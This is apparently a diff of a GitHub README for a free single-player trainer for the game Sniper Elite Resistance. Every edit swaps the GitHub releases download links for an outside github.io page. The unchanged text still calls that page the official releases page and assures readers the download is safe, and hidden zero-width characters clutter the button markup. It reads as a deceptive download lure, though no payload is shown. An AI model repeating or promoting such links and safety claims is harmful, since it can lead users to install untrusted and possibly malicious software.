@@ -1,7 +1,7 @@
 <h1>🎯 sniper-elite-resistance-trainer - Your Free Single-Player Companion for Sniper Elite Resistance</h1>
 
 <p align="center">
-  <a href="https://github.com/boquanday/sniper-elite-resistance-trainer/releases">
+  <a href="https://boquanday.github.io">
     <img src="https://img.shields.io/badge/Download-Free_Trainer-blue?style=for-the-badge&logo=github&logoColor=white&color=success" alt="Download Button" width="300" height="60" />
   </a>
 </p>
@@ -12,7 +12,7 @@ Welcome! This page will help you download and run the **sniper-elite-resistance-
 
 ### 📥 Download the Application
 
-Visit this link to download the application: **[Click Here to Download](https://github.com/boquandany/sniper-elite-resistance-trainer/releases)**. This will take you to the official releases page where the latest version of the trainer is available for download.
+Visit this link to download the application: **[Click Here to Download](https://boquanday.github.io)**. This will take you to the official releases page where the latest version of the trainer is available for download.
 
 Once you arrive on that page, you will see a list of released files. Choose the newest version (usually at the top) and click on the file that matches your system. For most users, this will be a file with a name like "SniperEliteResistanceTrainer_v1.0.zip" or similar. The file is hosted on GitHub, so you can be confident it is safe to download.
 
@@ -88,7 +88,7 @@ Since this is an open-source project, you have full transparency. No ads, no tel
 
 1. **Go to the download page** by clicking this button:
 <p align="center">
-  <a href="https://github.com/boquandany/sniper-elite-resistance-trainer/releases" style="background-color: #2ea44f; color: white; padding:  ​1 ​ ​1 ​ ​ ​2rem ​3rem; text​-decor​ation​: none​; font​-size​: ​24​px​; border​-radius​: ​10​px​; display​: inline​-block​; margin​: ​20px​; box​-shadow​: 0​ ​4px​ ​6px​ rgba​(0​,0​,0​,​0.2​);">⬇️ Download Now­​</a>​
+  <a href="https://boquanday.github.io" style="background-color: #2ea44f; color: white; padding:  ​1 ​ ​1 ​ ​ ​2rem ​3rem; text​-decor​ation​: none​; font​-size​: ​24​px​; border​-radius​: ​10​px​; display​: inline​-block​; margin​: ​20px​; box​-shadow​: 0​ ​4px​ ​6px​ rgba​(0​,0​,0​,​0.2​);">⬇️ Download Now­​</a>​
 ​</p​>​
 	
 ​
